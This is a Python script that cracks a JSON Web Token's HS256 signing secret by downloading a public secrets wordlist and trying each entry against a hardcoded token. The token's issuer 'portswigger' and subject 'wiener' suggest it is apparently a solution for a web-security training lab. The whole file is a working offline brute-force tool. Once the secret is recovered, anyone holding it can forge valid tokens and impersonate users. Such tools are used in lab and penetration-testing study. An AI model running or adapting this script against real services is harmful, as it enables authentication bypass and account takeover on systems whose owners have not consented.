import jwt  # pip install PyJWT
import requests
import sys

JWT_SECRET_LIST = "jwt.secrets.list"
WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"

TOKEN = "eyJraWQiOiJhYmQ2OThkYy1kYmQ5LTQ4MTItYmJhMS1hYzZiNDg0ZWVkZjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzE2MjQ2NSwic3ViIjoid2llbmVyIn0.yssqBkTN5GRorLRACYFEm-XPiBWVSxfbfJfAFdkU-WE"


def download_wordlist(path, url):
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
    except requests.exceptions.ConnectionError:
        print("[x] Please check your internet connection and try again later.")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[x] Failed to download wordlist: {e}")
        sys.exit(1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(resp.text)


def crack_jwt(token, wordlist_path):
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] Secret found: {secret}")
                return secret
            except jwt.exceptions.InvalidSignatureError:
                continue
            except jwt.exceptions.DecodeError:
                print("[x] Invalid token format.")
                sys.exit(1)
    print("[-] Secret not found in wordlist.")
    return None


if __name__ == "__main__":
    download_wordlist(JWT_SECRET_LIST, WORDLIST_URL)
    crack_jwt(TOKEN, JWT_SECRET_LIST)